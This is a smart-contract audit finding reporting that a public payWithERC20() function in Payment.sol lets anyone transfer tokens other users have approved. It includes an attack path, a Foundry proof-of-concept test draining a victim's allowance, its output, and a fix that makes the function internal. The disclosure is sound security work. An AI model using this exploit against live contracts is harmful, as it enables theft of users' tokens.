## Findings

## HIGH: Attacker can steal all tokens as a result of the payWithERC20() function being public

The function `payWithERC20()` on `payment.sol` is used to facilitate payments when creating agents and when user makes a top up.
The bug happens because this function is exposed to the public and as such can be called by anyone. **An attacker can call this function to steal any approved tokens from any address, since the attacker would be able to pass the fromAddress of their choice.**

### Root Cause

In Payment.sol the function `payWithERC20` is exposed to the public
https://github.com/sherlock-audit/2025-03-crestal-network/blob/main/crestal-omni-contracts/src/Payment.sol#L25-L32
Note this is a public function and as such anyone can call this function.
Making this function a public function is the issue as it allows anyone to invoke it

### Internal Pre-conditions

    1. Victim has approved the contract to spend some of their tokens, which is common as we need approval to create agents

### Attack Path

    1. A user(ALICE) intends to interact with the contract in creating an agent
    2. Alice decides to approve the contract to spend some of her tokens(to avoid doing this every time, ALICE approves max(uint256)
    3. Attacker directly calls `payWithERC20()` passing ALICE address as the `fromAddress` and the `ATTACKER` address as the `toAddress` and Amount > 0
    4. since all the checks would pass, ALICE balance would be transfered to Attacker

### Impact

An attacker can steal all approved tokens from a given user. Since the caller can pass any address as the fromAddress, the attacker can pass any arbitrary address and steal all the tokens

When creating agent's users approve the contract to spend some tokens, if a user approves the contract to spend more than what they would need to create the agent eg max approvals, the attacker can steal any amount that was approved and has not been used yet.

### PoC

Add the following test to

```solidity
    function testStealApprovedTokens() public {
        uint256 validTokenAmount = 100 * 10 ** 18;
        address ALICE = makeAddr("ALICE");
        address ATTACKER = makeAddr("Attacker");
        mockToken.mint(ALICE, validTokenAmount);

        // Verify the mint
        uint256 balance = mockToken.balanceOf(ALICE);
        assertEq(balance, validTokenAmount, "sender does not have the correct token balance");

        // Approve the blueprint contract to spend tokens directly from the test contract
        vm.prank(ALICE);
        mockToken.approve(address(blueprint), validTokenAmount);

        // check allowance after approve
        uint256 allowance = mockToken.allowance(ALICE, address(blueprint));
        assertEq(allowance, validTokenAmount, "sender does not have the correct token allowance");

        //log balances before
        console.log("alice balance before", mockToken.balanceOf(ALICE));
        console.log("attacker balance before", mockToken.balanceOf(ATTACKER));

        // test stealing after approval
        vm.prank(ATTACKER);
        blueprint.payWithERC20(address(mockToken), validTokenAmount, ALICE, ATTACKER);

        // check balance after stealing
        console.log("alice balance after", mockToken.balanceOf(ALICE));
        console.log("attacker balance after", mockToken.balanceOf(ATTACKER));
    }
```

The above test should result in the following

```
[PASS] testStealApprovedTokens() (gas: 100398)
Logs:
  alice balance before 100000000000000000000
  attacker balance before 0
  alice balance after 0
  attacker balance after 100000000000000000000
```

### Mitigation

Simply making the function as an internal one would fix the issue

```diff
-    function payWithERC20(address erc20TokenAddress, uint256 amount, address fromAddress, address toAddress) public {
+    function payWithERC20(address erc20TokenAddress, uint256 amount, address fromAddress, address toAddress) internal {
```
